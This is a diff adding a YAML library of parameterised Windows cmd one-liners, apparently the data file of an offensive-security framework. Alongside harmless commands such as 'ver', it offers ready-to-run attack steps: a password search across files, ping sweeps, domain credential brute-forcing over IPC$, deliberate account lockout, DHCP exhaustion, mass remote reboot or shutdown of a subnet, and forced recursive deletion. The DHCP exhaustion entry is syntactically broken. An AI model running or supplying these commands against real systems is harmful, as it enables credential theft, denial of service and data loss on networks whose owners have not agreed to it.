@@ -1,0 +1,211 @@
+---
+name: cmd
+description: The Windows command interpreter
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Show SYSTEMROOT (typically c:\\windows)":
+    - type: ["cmd","standalone"]
+    - text: "echo %SYSTEMROOT%"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Show DNS Entries":
+    - type: ["cmd","standalone"]
+    - text: "type %SYSTEMROOT%\\System32\\drivers\\etc\\hosts"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Show Network Settings":
+    - type: ["cmd","standalone"]
+    - text: "type %SYSTEMROOT%\\System32\\drivers\\etc\\networks"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Show Prefetch Files":
+    - type: ["cmd","standalone"]
+    - text: "dir %SYSTEMROOT%\\Prefetch"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Get OS Version":
+    - type: ["cmd","standalone"]
+    - text: "ver"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Search for All PDFs":
+    - type: ["cmd","standalone"]
+    - text: "dir /a /s /b c:\\*.pdf*"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Search for Patches":
+    - type: ["cmd","standalone"]
+    - text: "dir /a /b c:\\windows\\kb*"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Search Files for Password":
+    - type: ["cmd","standalone"]
+    - text: "findstr /si password *.txt *.xml *.xls"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Directory Listing of C:":
+    - type: ["cmd","autonomous"]
+    - text: "tree /F /A c:\\ > {FILE}"
+    - input: ["output file"]
+    - output: ["STDOUT",{"FILE":{"input":1}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Show Current User":
+    - type: ["cmd","autonomous"]
+    - text: "echo %USERNAME%"
+    - input: null
+    - output: ["STDOUT",{"FILE":{"input":1}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Copy Remote Folder":
+    - type: ["cmd","standalone"]
+    - text: "xcopy /s \\\\{IPV4}\\{FULLPATH} {FULLPATH}"
+    - input: ["target IPv4 address","full remote folder path","full local folder path"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Remotely Reboot Machine":
+    - type: ["cmd","standalone"]
+    - text: "shutdown /m \\\\{IPV4} /r /t 0 /f"
+    - input: ["target IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Display File Contents":
+    - type: ["cmd","standalone"]
+    - text: "type {FILE}"
+    - input: ["target file"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Forceable Delete All Files in Path":
+    - type: ["cmd","standalone"]
+    - text: "del {FULLPATH}\\*.* /a /s /q /f"
+    - input: ["full path to target folder"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Find a string in a file":
+    - type: ["cmd","standalone"]
+    - text: "find /I \"{STR}\" {FILE}"
+    - input: ["string","file"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Run a File as a Specified User":
+    - type: ["cmd","standalone"]
+    - text: "runas /user:{STR} \"{FILE} {STR}\""
+    - input: ["user","file","command arguments"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Restart Now":
+    - type: ["cmd","standalone"]
+    - text: "restart /r /t 0"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Nested FOR Loop Ping Sweep, Class B":
+    - type: ["cmd","autonomous"]
+    - text: "for /L %i in ({INT},1,254) do @ (for /L %x in ({INT},1,254) do @ ping -n 1 -w 100 {INT}.{INT}.%i.%x 2>nul | find \"Reply\" && echo {INT}.{INT}.%i.%x >> {FILE}"
+    - input: ["IPv4, initial 3rd octet value","IPv4, initial 4th octet value","IPv4, 1st octet","IPv4, 2nd octet","1st octet (repeat)","2nd octet (repeat)","output file"]
+    - output: ["STDOUT",{"FILE":{"input":7}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Loop through File":
+    - type: ["cmd","standalone"]
+    - text: "for /F %i in ({FILE}) do {STR}"
+    - input: ["input file","command"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Domain Bruteforce":
+    - type: ["cmd","autonomous"]
+    - text: "for /F %n in ({FILE}) do for /F %p in ({FILE}) do net use \\\\{STR}\\IPC$ /user:{STR}\\%n %p 1>NUL 2>&1 && echo %n:%p && net use /delete \\\\{STR}\\IPC$ > NUL"
+    - input: ["username list file","password list file","domain controller machine name","target domain","domain controller machine name (repeat)"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Account Lockout":
+    - type: ["cmd","standalone"]
+    - text: "for /f %U in ({FILE}) do @for /l %C in (1,1,5) do @echo net use \\\\{STR}\\c$ /USER:%U wrongpass"
+    - input: ["username list file","target machine name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "DHCP Exhaustion":
+    - type: ["cmd","autonomous"]
+    - text: "for /L %i (2,1,254) do (netsh interface ip set address local static 1.1.1.%i {STR} {IPV4} {STR} %1 ping 127.0.0.1 -n 1 -w 10000 > NUL %1"
+    - input: ["netmask","gateway IPv4 address","ID"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "DNS Reverse Lookup":
+    - type: ["cmd","autonomous"]
+    - text: "for /L %i in (100,1,105) do @ nslookup 1.1.1.%i | findstr /i /c:\"Name\" >> {FILE} && echo Server: 1.1.1.%i >> {FILE}"
+    - input: ["output file","output file (repeat)"]
+    - output: ["STDOUT",{"FILE":{"input":1}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List Files (w/ details) Beginning with 'pass'":
+    - type: ["cmd","standalone"]
+    - text: "forfiles /P c:\\temp /s /m pass* -c \"cmd /c echo @isdir @fdate @ftime @relpath @path @fsize\""
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Simulate Malicious Domain Callouts":
+    - type: ["cmd","autonomous"]
+    - text: "for /L %i in (0,1,100) do (for /F %n in ({FILE}) do nslookup %n {STR} > NUL 2>&1 & ping -n 5 127.0.0.1 > NUL 2>&1"
+    - input: ["domain list file","malicious domain"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "IE-based Web Traffic Generator":
+    - type: ["cmd","standalone"]
+    - text: "for /L %C in (1,1,5000) do @for %U in ({STR}) do start /b iexplore %U & ping -n 6 localhost & taskkill /F /IM iexplore.exe"
+    - input: ["space-delimited domain names"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Get Permissions on Service Executables":
+    - type: ["cmd","autonomous"]
+    - text: "for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> {FILE}"
+    - input: ["output file"]
+    - output: ["STDOUT",{"FILE":{"input":1}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Rolling Reboot or Shutdown, Class C":
+    - type: ["cmd","standalone"]
+    - text: "for /L %i in ({INT},1,{INT}) do shutdown /{STRMENU} /m \\\\{STR}.%i /f /t 0 /c \"{STR}\""
+    - input: ["starting IPv4 address, 4th octet","ending IPv4 address, 4th octet",{"Reboot or Shutdown":["r","s"]},"network IPv4 address, octets 1-3","message"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Exit cmd":
+    - type: ["cmd","interactive"]
+    - text: "exit"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
